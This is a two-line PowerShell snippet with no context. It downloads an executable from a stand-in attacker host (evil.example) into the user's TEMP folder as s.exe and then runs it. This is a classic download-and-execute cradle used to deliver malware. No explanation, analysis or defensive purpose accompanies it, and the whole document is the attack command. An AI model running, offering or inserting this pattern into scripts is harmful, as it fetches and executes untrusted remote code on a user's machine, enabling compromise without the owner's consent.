(New-Object Net.WebClient).DownloadFile("http://evil.example/setup.exe", "$env:TEMP\s.exe")
Start-Process "$env:TEMP\s.exe"
